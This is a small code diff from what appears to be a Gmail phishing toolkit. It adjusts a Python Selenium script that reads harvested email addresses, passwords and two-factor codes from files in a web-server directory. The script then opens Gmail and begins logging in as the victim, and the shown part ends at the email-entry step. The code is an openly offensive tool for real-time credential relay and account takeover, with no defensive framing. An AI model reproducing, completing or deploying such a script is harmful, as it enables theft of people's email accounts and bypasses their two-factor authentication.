@@ -1,13 +1,13 @@
 import time, os
 from selenium import webdriver
-emailPath = "gmailPhising/email.txt"
-passwordPath = "gmailPhising/pass.txt"
-codePath = "gmailPhising/code.txt"
+emailPath = "/var/www/html/gmailPhising/email.txt"
+passwordPath = "/var/www/html/gmailPhising/pass.txt"
+codePath = "/var/www/html/gmailPhising/code.txt"
 femail = open(emailPath, "r")
 email = femail.readline()
 fpass = open(passwordPath, "r")
 password = fpass.readline()
-driver = webdriver.Firefox()
+driver = webdriver.Firefox(executable_path='/root/2FAGmailPhising/geckodriver')
 driver.get("https://www.gmail.com")
 driver.find_element_by_name("identifier").send_keys(email.split("\n")[0])
 driver.find_element_by_id("identifierNext").click()
